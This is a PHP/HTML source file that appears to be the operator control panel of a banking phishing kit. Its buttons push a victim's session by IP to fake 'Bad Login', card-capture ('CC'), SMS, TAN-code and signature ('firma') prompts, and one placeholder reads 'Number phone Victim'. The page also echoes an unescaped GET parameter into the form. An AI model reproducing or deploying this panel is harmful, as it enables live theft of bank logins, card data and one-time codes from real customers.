<?php
    /*******
    Main Author: MemoryError
    ********************************************************/
    
?>
<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="assets/css/helpers.css">
        <link rel="stylesheet" href="assets/css/style.css">

        <link rel="icon" type="image/x-icon" href="assets/imgs/success.png" />

        <title>Control</title>
    </head>

    <body>
        
        <div class="container text-center pt30 pb30">
            <form method="post" action="index-.php">
                <input type="hidden" name="step" value="control">
                <input type="hidden" name="ip" value="<?php echo $_GET['ip']; ?>">
                <button type="submit" class="btn btn-danger" name="to" value="errorlogin">Bad Login</button>  
                <button type="button" class="btn btn-dark" href="#firma">FIRMA</button>
                <button type="button" class="btn btn-primary" href="#sms">SMS</button> 
                <button type="submit" class="btn btn-success" name="to" value="cc">CC</button>
                <button type="submit" class="btn btn-primary" name="to" value="success">Success</button>

                 <div id="sms" class="collapse mt-5" style="max-width: 500px; margin: 0 auto;">
                    <textarea name="sms_text" class="form-control mb-3" id="sms_text" cols="30" rows="3" placeholder="Number phone Victim *********521"></textarea>
                    <button type="submit" class="btn btn-success" name="to" value="sms">Submit</button>
                </div>
				 <div id="firma" class="collapse mt-5" style="max-width: 500px; margin: 0 auto;">
                    <textarea name="sms_text" class="form-control mb-3" id="sms_text" cols="30" rows="3" placeholder="EX:B2 / B4 / B6/ "></textarea>
                    <button type="submit" class="btn btn-success" name="to" value="firma">Submit</button>
                </div>

                <div id="errorsms" class="collapse mt-5" style="max-width: 500px; margin: 0 auto;">
                    <textarea class="form-control mb-3" name="errorsms_text" id="errorsms_text" cols="30" rows="3"></textarea>
                    <button type="submit" class="btn btn-danger" name="to" value="errorsms">Submit</button>
                </div>

                <div id="tan" class="collapse mt-5" style="max-width: 500px; margin: 0 auto;">
                    <textarea name="tan_text" class="form-control mb-3" id="tan_text" cols="30" rows="3" placeholder="EX: code1/code2/code3/code4"></textarea>
                    <button type="submit" class="btn btn-success" name="to" value="tan">Submit</button>
                </div>

                <div id="errortan" class="collapse mt-5" style="max-width: 500px; margin: 0 auto;">
                    <textarea name="errortan_text" class="form-control mb-3" id="errortan_text" cols="30" rows="3" placeholder="EX: code1/code2/code3"></textarea>
                    <button type="submit" class="btn btn-danger" name="to" value="errortan">Submit</button>
                </div>			

            </form>
        </div>

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/js/all.min.js"></script>
        <script src="assets/js/script.js"></script>

        <script>
            $('button[type="button"]').click(function(){
                var href = $(this).attr('href');
                $(href).slideToggle(100);
            });
        </script>

    </body>

</html>